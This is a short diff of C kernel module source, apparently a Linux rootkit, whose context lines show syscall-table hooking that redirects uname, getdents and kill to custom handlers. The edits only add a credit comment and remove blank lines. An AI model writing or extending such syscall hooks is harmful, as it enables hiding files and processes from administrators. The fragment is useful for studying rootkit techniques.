@@ -43,6 +43,9 @@ Task:
 	barrier(); \
 	preempt_enable();
 
+
+//## /Credit ##
+
 //Declare vars
 static unsigned long *__sys_call_table;
 
@@ -340,8 +343,6 @@ goof_init(void) {
 	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
 	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
 	create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
-
-
 	//Creating a new trampoline - DEBUG
 	
 	printk("[goof] DEBUG\n ");
